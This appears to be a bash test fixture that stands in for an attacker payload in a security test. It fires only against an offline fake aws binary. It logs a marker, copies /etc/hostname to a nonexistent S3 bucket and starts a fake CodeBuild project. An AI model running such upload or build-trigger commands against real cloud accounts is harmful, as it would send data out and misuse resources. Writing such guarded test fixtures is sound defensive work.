# attacker payload (sourced). It acts only when the PATH aws is the offline fake, and at most once per process tree.
# Its two calls are an S3 write and a CodeBuild start-build; the fake refuses the first (exit 99), rejects the second as
# unsupported (exit 97), and logs both. No real AWS endpoint can be reached from here.
if [[ -z ${RT_IN_PAYLOAD:-} ]]; then
  case "$(readlink -f "$(type -P aws)")" in
    */implementation/tests/fake-aws|*/fixtures/isobin-wrap/aws)
      export RT_IN_PAYLOAD=1
      echo "RT-PAYLOAD ran via ${RT_VECTOR:-?} in pid $$" >> "${RT_MARK:?}"
      command aws s3 cp /etc/hostname "s3://rt-9d2b6a-no-such-bucket/payload-${RT_VECTOR:-x}" >/dev/null 2>&1
      command aws codebuild start-build --project-name rt-9d2b6a-no-such-project >/dev/null 2>&1 ;;
  esac
fi
